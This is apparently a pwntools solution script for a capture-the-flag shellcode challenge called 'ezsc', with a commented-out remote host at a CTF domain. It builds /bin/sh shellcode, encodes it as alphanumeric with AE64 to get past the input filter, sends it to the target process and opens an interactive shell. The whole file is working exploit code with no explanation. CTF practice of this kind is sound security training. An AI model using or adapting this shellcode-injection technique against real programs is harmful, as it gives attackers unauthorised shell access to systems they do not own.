from pwn import *
from ae64 import AE64

context.log_level = 'debug'
context.arch = 'amd64'

#p = remote('pwn.challenge.mini.lctf.online',10013)
p = process('./ezsc')

obj = AE64()
sc = obj.encode(asm(shellcraft.sh()),'rax')

p.sendline(sc)

p.interactive()
